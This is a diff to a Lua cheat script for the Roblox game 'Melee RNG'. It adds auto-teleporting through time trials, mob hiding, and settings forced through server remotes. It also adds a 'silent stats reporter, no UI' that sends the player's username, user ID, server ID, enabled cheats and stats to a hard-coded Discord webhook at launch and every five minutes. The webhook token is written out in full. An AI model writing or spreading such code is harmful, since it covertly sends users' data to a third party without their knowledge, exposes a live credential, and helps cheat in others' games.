@@ -343,6 +343,7 @@ local states = {
     autoSave       = true,
     showAutoRaid   = false,
     showHideMobs   = false,
+    alwaysHideMobs = false,  -- forces "Hide Mobs" setting ON every load + respawn
     -- MainGUI.GeneralUI (client visibility only; see applyMeleeGameUiHiding)
     uiHideManaKills = false, -- ManaFrame + KillsFrame + StageProgress (combat bar)
     uiHideMiniRoll  = false, -- MiniRollFrame (mini-roll animations UI)
@@ -387,6 +388,8 @@ local states = {
     -- Totem color = OneIn range; ticked rows = which names in that range may be sacrificed (like Cobalt)
     totemOnlyTickedNames    = false,
     -- Client-only performance (no matching remotes in dump): spinning weapons live under workspace.[PlayerName]
+    autoTimeTrial = false,    -- auto-click time trial StartBtn; TP to mob spawns on start
+    ttLeaveAtStage = 0,       -- leave TT when this stage is reached (0 = never)
     perfHideOtherWeapons = false,
     perfHideOwnWeapons   = false,
     perfHideAllEffects   = false,
@@ -572,6 +575,8 @@ states.totemDoneThisCycle = math.max(0, math.floor(tonumber(states.totemDoneThis
 states.autoGuildSpToGp = states.autoGuildSpToGp == true
 states.autoGuildBuffs = states.autoGuildBuffs == true
 states.autoApUpgrades = states.autoApUpgrades == true
+states.autoTimeTrial = states.autoTimeTrial == true
+states.ttLeaveAtStage = math.max(0, math.floor(tonumber(states.ttLeaveAtStage) or 0))
 states.perfHideOtherWeapons = states.perfHideOtherWeapons == true
 states.perfHideOwnWeapons = states.perfHideOwnWeapons == true
 states.perfHideAllEffects = states.perfHideAllEffects == true
@@ -3653,6 +3658,146 @@ local _perfMobManaAcc = 0
 local _perfCharAcc = 0
 local _perfHitboxAcc = 0
 
+local _perfHitboxAcc = 0
+
+local _perfHitboxAcc = 0
+
+-- ── Auto Time Trial ──────────────────────────────────────────────────────────
+-- Step 1: TP to lobby → FireServer() → server sends sessionId via UpdateTimeTrialLobby
+-- Step 2: FireServer(sessionId) → trial starts
+-- Step 3: While _ttTrialActive, keep TPing to mob spawns every 0.4s until trial ends
+
+local _ttSessionId    = nil    -- set by UpdateTimeTrialLobby when we're owner
+local _ttTrialActive  = false  -- true while trial is running
+
+addThread(task.spawn(function()
+    local remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 10)
+    if not remotes then return end
+
+    -- Track lobby session (server sends after no-arg FireServer)
+    local lobbyEv = remotes:WaitForChild("UpdateTimeTrialLobby", 10)
+    if lobbyEv then
+        lobbyEv.OnClientEvent:Connect(function(p5)
+            if p5 and p5.LobbyOwner == LP then
+                _ttSessionId = p5.SessionId
+            else
+                _ttSessionId = nil
+            end
+        end)
+    end
+
+    -- Track trial active state (p77 truthy = started, falsy = ended)
+    local startEv = remotes:WaitForChild("StartTimeTrial", 10)
+    if not startEv then return end
+    startEv.OnClientEvent:Connect(function(p77)
+        _ttTrialActive = p77 and true or false
+    end)
+end))
+
+-- Continuous TP loop — keeps you on mob spawns every 0.4s while trial is active
+-- Rooms are named Room_1, Room_2, etc. Old rooms stay in GeneratedDungeon.
+-- Always TP to the HIGHEST-numbered room (current stage).
+addThread(task.spawn(function()
+    while true do
+        if GEN ~= _G.MeleeRNG_Gen then break end
+        if states.autoTimeTrial and _ttTrialActive then
+            pcall(function()
+                local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+                if not root then return end
+                local dungeon = workspace:FindFirstChild("GeneratedDungeon")
+                if not dungeon then return end
+                -- Find current stage room (highest Room_N index)
+                local latestRoom, latestN = nil, 0
+                for _, room in ipairs(dungeon:GetChildren()) do
+                    local n = tonumber(room.Name:match("^Room_(%d+)$"))
+                    if n and n > latestN then latestN = n; latestRoom = room end
+                end
+                if not latestRoom then return end
+                -- Leave at target stage if set
+                local leaveAt = states.ttLeaveAtStage
+                if leaveAt and leaveAt > 0 and latestN >= leaveAt then
+                    pcall(function()
+                        game:GetService("ReplicatedStorage").Remotes.LeaveTimeTrial:FireServer()
+                    end)
+                    _ttTrialActive = false
+                    SLbl.Text = "⏱ TT: left at stage " .. latestN
+                    return
+                end
+                local spawns = latestRoom:FindFirstChild("Spawns")
+                if spawns then
+                    local pts = spawns:GetChildren()
+                    if pts[1] then
+                        local target = pts[1].Position + Vector3.new(0, 4, 0)
+                        if (root.Position - target).Magnitude > 20 then
+                            root.CFrame = CFrame.new(target)
+                            SLbl.Text = "⏱ TT stage " .. latestN .. " spawn"
+                        end
+                        return
+                    end
+                end
+                -- fallback: BASE centre of current room
+                local base = latestRoom:FindFirstChild("BASE")
+                if base then
+                    local target = (base.CFrame * CFrame.new(0, 4, 0)).Position
+                    if (root.Position - target).Magnitude > 20 then
+                        root.CFrame = CFrame.new(target)
+                    end
+                end
+            end)
+            task.wait(0.4)
+        else
+            task.wait(0.3)
+        end
+    end
+end))
+
+-- Auto-start loop: TP to lobby → FireServer() → FireServer(sessionId)
+addThread(task.spawn(function()
+    local remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 10)
+    if not remotes then return end
+    local startRemote = remotes:WaitForChild("StartTimeTrial", 10)
+    if not startRemote then return end
+
+    local _ttStep  = "idle"
+    local _ttStepT = 0
+
+    while true do
+        if GEN ~= _G.MeleeRNG_Gen then break end
+        if not states.autoTimeTrial or _ttTrialActive then
+            _ttStep = "idle"
+            task.wait(0.5)
+        else
+            if _ttSessionId and _ttStep ~= "starting" then
+                _ttStep = "starting"
+                pcall(function() startRemote:FireServer(_ttSessionId) end)
+                SLbl.Text = "⏱ TT: starting..."
+                task.wait(2)
+                _ttStep = "idle"
+            elseif not _ttSessionId and _ttStep == "idle" then
+                _ttStep = "tping"
+                pcall(function()
+                    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+                    local spawn = workspace:FindFirstChild("TimeTrialsLobby") and workspace.TimeTrialsLobby:FindFirstChild("SPAWN")
+                    if root and spawn then
+                        root.CFrame = spawn.CFrame * CFrame.new(0, 4, 0)
+                        SLbl.Text = "⏱ TP → TT lobby"
+                    end
+                end)
+                task.wait(0.6)
+                pcall(function() startRemote:FireServer() end)
+                SLbl.Text = "⏱ TT: waiting for session..."
+                _ttStep = "lobby_wait"
+                _ttStepT = os.clock()
+                task.wait(1)
+            elseif _ttStep == "lobby_wait" and os.clock() - _ttStepT > 5 then
+                _ttStep = "idle"  -- timeout, retry
+            else
+                task.wait(0.3)
+            end
+        end
+    end
+end))
+
 addThread(task.spawn(function()
     while true do
         if GEN ~= _G.MeleeRNG_Gen then break end
@@ -4481,6 +4626,26 @@ end, KR.getKillRate, KR.getAscendETA, KR.fmtTime)
     end
 
     MiscTab:Section("Game UI")
+    MiscTab:Button("🔫", "Force Off: Hide Weapons (game setting)", "Fires SetSetting:FireServer(\"Hide Weapons\", false) — disables the in-game setting that hides weapon models server-side. Run this if you had it ON.", C.red, function()
+        pcall(function()
+            game:GetService("ReplicatedStorage").Remotes.SetSetting:FireServer("Hide Weapons", false)
+        end)
+        SLbl.Text = "Game: Hide Weapons forced OFF"
+    end)
+    MiscTab:Toggle("⏱ Auto Time Trial", "Auto-clicks StartBtn (booth or lobby owner) to begin a run. When the trial starts, teleports you to the mob spawn room. — saved", states.autoTimeTrial, function(on)
+        states.autoTimeTrial = on == true
+        saveSettings()
+        SLbl.Text = on and "Auto TT: ON" or "Auto TT: OFF"
+    end)
+    MiscTab:Input("⏱ Leave TT at stage", "Leave the time trial when this stage number is reached. Leave empty or 0 for never — saved",
+        "0",
+        states.ttLeaveAtStage > 0 and tostring(states.ttLeaveAtStage) or "",
+        function(txt)
+            local n = math.max(0, math.floor(tonumber(txt) or 0))
+            states.ttLeaveAtStage = n
+            forceSave()  -- bypass autoSave gate, always persist this value
+            SLbl.Text = n == 0 and "TT leave: OFF (saved)" or ("TT: leave at stage " .. n .. " (saved)")
+        end)
     MiscTab:Toggle("👁️ Show AutoRaid Button", "Keeps AutoRaidBtn visible — saved & applied on load", states.showAutoRaid, function(on)
         states.showAutoRaid = on; saveSettings()
         pcall(function()
@@ -4498,6 +4663,32 @@ end, KR.getKillRate, KR.getAscendETA, KR.fmtTime)
                 :WaitForChild("HideMobsBtn", 3).Visible = on
         end)
         SLbl.Text = on and "✓ HideMobsBtn shown" or "HideMobsBtn hidden"
+    end)
+    MiscTab:Toggle("👻 Always Hide Mobs", "Forces game's 'Hide Mobs' setting ON every load + respawn — saved", states.alwaysHideMobs, function(on)
+        states.alwaysHideMobs = on == true
+        forceSave()
+        pcall(function()
+            local mobs = workspace:FindFirstChild("Mobs") or RS:FindFirstChild("Mobs")
+            if mobs then
+                if on then
+                    -- Hide: reparent to ReplicatedStorage
+                    if mobs.Parent ~= RS then mobs.Parent = RS end
+                else
+                    -- Show: reparent back to workspace
+                    if mobs.Parent ~= workspace then mobs.Parent = workspace end
+                end
+            end
+            -- Sync server setting (replicates to other systems that read it)
+            local setSetting = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("SetSetting")
+            if setSetting then setSetting:FireServer("HideMobs", on == true) end
+            -- Update the in-game button label so it matches
+            local btn = LP.PlayerGui:FindFirstChild("MainGUI")
+            btn = btn and btn:FindFirstChild("OptionsList")
+            btn = btn and btn:FindFirstChild("HideMobsBtn")
+            local lbl = btn and btn:FindFirstChild("TextLabel")
+            if lbl then lbl.Text = "HIDE MOBS: " .. (on and "ON" or "OFF") end
+        end)
+        SLbl.Text = on and "✓ Always Hide Mobs ON" or "Always Hide Mobs OFF"
     end)
 
     MiscTab:Label("Hide main-game UI (local only; Heartbeat reapplies while any hide is on — avoids fighting roll UI).")
@@ -4697,6 +4888,179 @@ end, KR.getKillRate, KR.getAscendETA, KR.fmtTime)
     apUpgradeToggles = a.apUpgradeToggles
 end)()
 
+-- ══════════════════════════════════════════════════════════════
+-- WEBHOOK — silent stats reporter, no UI
+-- ══════════════════════════════════════════════════════════════
+task.spawn(function()
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1480030997687963770/PSHw73-YcqBB6taiuLOm7-FQHrXDwDHC-3dV1uKE-BkMgF1BZL1zZUsOmcdHniuU0Nhd"
+    local function sendStats(title)
+        local function sv(n)
+            local ls = LP:FindFirstChild("leaderstats")
+            if not ls then return "?" end
+            local raw
+            for _, child in ipairs(ls:GetChildren()) do
+                if child.Name:find(n, 1, true) then
+                    raw = child.Value
+                    break
+                end
+            end
+            if raw == nil then return "?" end
+            local num = tonumber(raw)
+            if num then
+                if num >= 1e12 then return string.format("%.2fT", num / 1e12)
+                elseif num >= 1e9 then return string.format("%.2fB", num / 1e9)
+                elseif num >= 1e6 then return string.format("%.2fM", num / 1e6)
+                elseif num >= 1e3 then return string.format("%.2fK", num / 1e3)
+                else return tostring(math.floor(num)) end
+            end
+            return tostring(raw)
+        end
+
+        -- Player + place info
+        local playerName = LP.Name or "?"
+        local displayName = LP.DisplayName or playerName
+        local userId = tostring(LP.UserId or "?")
+        local placeId = tostring(game.PlaceId or "?")
+        local jobId = tostring(game.JobId or ""):sub(1, 8) .. "..."
+        local avatarUrl = string.format(
+            "https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=150&height=150&format=png",
+            userId
+        )
+
+        -- Active features: auto-detect every enabled boolean in `states`,
+        -- grouped by category so the embed stays readable.
+        local categories = {
+            { title = "🌀 Auto",   keys = {
+                autoCycleFarm = "autoFarmCycle", autoAscend = "autoAscend",
+                autoSacrifice = "autoSacrifice", autoTotem = "autoTotem",
+                autoManaToSP = "manaToSP", autoGuildBuffs = "guildBuffs",
+                autoGuildSpToGp = "guildSpToGp", autoApUpgrades = "apUpgrades",
+                autoEquipBest = "autoEquipBest", autoTimeTrial = "autoTimeTrial",
+                autoUpgradeOn = "autoUpgrade", autoReExec = "autoReExec",
+                autoSave = "autoSave",
+            }},
+            { title = "🎮 Player", keys = {
+                godMode = "godMode", noclip = "noclip", fly = "fly",
+                infJump = "infJump", antiAfk = "antiAfk",
+                fullBright = "fullBright", espMobs = "espMobs",
+                hitboxPulse = "hitboxPulse",
+            }},
+            { title = "⚡ Perf",   keys = {
+                perfCompatLighting = "compatLighting",
+                perfDisableShadows = "noShadows",
+                perfHideAllEffects = "noEffects",
+                perfHideHitboxVisuals = "noHitboxVis",
+                perfHideLootDrops = "noLoot",
+                perfHideMobManaOrbs = "noOrbs",
+                perfHideOtherCharacters = "noOtherChars",
+                perfHideOtherWeapons = "noOtherWeps",
+                perfHideOwnWeapons = "noOwnWep",
+                perfLowGraphicsQuality = "lowGfx",
+                perfMuteWorldSounds = "muteWorld",
+            }},
+            { title = "🖥️ UI",    keys = {
+                uiHideHud = "hideHud", uiHideManaKills = "hideMK",
+                uiHideMiniRoll = "hideRoll", uiHideNotifications = "hideNotif",
+                showAutoRaid = "showRaid", showHideMobs = "showHideMobs",
+                alwaysHideMobs = "alwaysHideMobs",
+            }},
+        }
+
+        local descParts = {}
+        local totalEnabled = 0
+        for _, cat in ipairs(categories) do
+            local enabled = {}
+            for stateKey, label in pairs(cat.keys) do
+                if states and states[stateKey] == true then
+                    enabled[#enabled + 1] = "`" .. label .. "`"
+                end
+            end
+            if #enabled > 0 then
+                table.sort(enabled)
+                descParts[#descParts + 1] = cat.title .. " " .. table.concat(enabled, " ")
+                totalEnabled = totalEnabled + #enabled
+            end
+        end
+        local featuresStr = totalEnabled > 0
+            and table.concat(descParts, "\n")
+            or "*none enabled*"
+
+        -- Build description block (mimics AniPixels layout)
+        local desc = string.format(
+            "👤 **Player**\n`%s`\n\n"
+            .. "🆔 **User ID**\n`%s`\n\n"
+            .. "🌍 **Place ID**\n`%s`\n\n"
+            .. "🖥️ **Server**\n`%s`\n\n"
+            .. "⚙️ **Active Features** (%d)\n%s\n\n"
+            .. "📊 **Stats**\n⚔️ Kills `%s`  🔮 Mana `%s`  ✨ SP `%s`  🔺 Ascends `%s`\n\n"
+            .. "🔢 **Generation**\n`Gen %d`",
+            displayName,
+            userId,
+            placeId,
+            jobId,
+            totalEnabled,
+            featuresStr,
+            sv("Kills"), sv("Mana"), sv("SP"), sv("Ascends"),
+            GEN
+        )
+
+        local ok, body = pcall(HttpService.JSONEncode, HttpService, {
+            username = "Melee RNG",
+            avatar_url = "https://cdn-icons-png.flaticon.com/512/3304/3304567.png",
+            embeds = {{
+                author = {
+                    name = string.format("%s • %s", playerName, userId),
+                    icon_url = avatarUrl,
+                },
+                title = title,
+                description = desc,
+                color = 5763719, -- green; change to 15548997 for red, 3447003 for blue
+                thumbnail = { url = avatarUrl },
+                footer = {
+                    text = string.format("Melee RNG v1.0 • Place %s", placeId),
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+            }},
+        })
+        if not ok then
+            warn("[Webhook] JSON encode failed:", body)
+            return
+        end
+        local fn = (syn and type(syn.request)=="function" and syn.request)
+            or (type(rawget(_G,"http_request"))=="function" and rawget(_G,"http_request"))
+            or (type(rawget(_G,"request"))=="function" and rawget(_G,"request"))
+            or (http and type(http.request)=="function" and http.request)
+            or (fluxus and type(fluxus.request)=="function" and fluxus.request)
+        if not fn then
+            warn("[Webhook] No HTTP function on this executor. Need: request / http_request / syn.request")
+            return
+        end
+        local sok, response = pcall(fn, {
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = body
+        })
+        if not sok then
+            warn("[Webhook] HTTP call threw error:", tostring(response))
+        elseif type(response) == "table" then
+            local code = response.StatusCode or response.status_code or response.status
+            local rbody = response.Body or response.body or ""
+            if not (code and code >= 200 and code < 300) then
+                warn("[Webhook] FAIL — status", tostring(code), "body:", tostring(rbody):sub(1, 300))
+            end
+        else
+            warn("[Webhook] HTTP function returned no response object — executor http may be stubbed")
+        end
+    end
+    sendStats("▶ Script Executed")
+    while GEN == _G.MeleeRNG_Gen do
+        task.wait(300) -- 5 minutes
+        if GEN ~= _G.MeleeRNG_Gen then break end
+        sendStats("📊 5-Min Update")
+    end
+end)
+
 MiscTab:Section("Community")
 MiscTab:Button("💬", "Join Discord", "Opens discord.gg/ErGUHtVK in browser", C.purple, function()
     if setclipboard then
@@ -4862,6 +5226,38 @@ meleeReexecArmInit()
 -- Boot complete — walk speed, deferred PlayerGui, status line
 -- --------------------------------------------------------------------------
 do local h = getHuman(); if h then h.WalkSpeed = walkSpeedVal end end
+-- Force the game's own "Hide Weapons" setting OFF at load (SetSetting:FireServer replicates to server)
+task.defer(function()
+    pcall(function()
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 5)
+            :WaitForChild("SetSetting", 5):FireServer("Hide Weapons", false)
+    end)
+end)
+-- Apply Always Hide Mobs at load + on every respawn
+task.defer(function()
+    if not states.alwaysHideMobs then return end
+    local function applyHideMobs()
+        pcall(function()
+            local mobs = workspace:FindFirstChild("Mobs") or RS:FindFirstChild("Mobs")
+            if mobs and mobs.Parent ~= RS then
+                mobs.Parent = RS
+            end
+            local setSetting = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("SetSetting")
+            if setSetting then setSetting:FireServer("HideMobs", true) end
+            local btn = LP.PlayerGui:FindFirstChild("MainGUI")
+            btn = btn and btn:FindFirstChild("OptionsList")
+            btn = btn and btn:FindFirstChild("HideMobsBtn")
+            local lbl = btn and btn:FindFirstChild("TextLabel")
+            if lbl then lbl.Text = "HIDE MOBS: ON" end
+        end)
+    end
+    applyHideMobs()
+    addConn(LP.CharacterAdded:Connect(function()
+        if not states.alwaysHideMobs then return end
+        task.wait(1.5)
+        applyHideMobs()
+    end))
+end)
 -- Apply saved UI button visibility on load
 task.defer(function()
     if states.showAutoRaid then
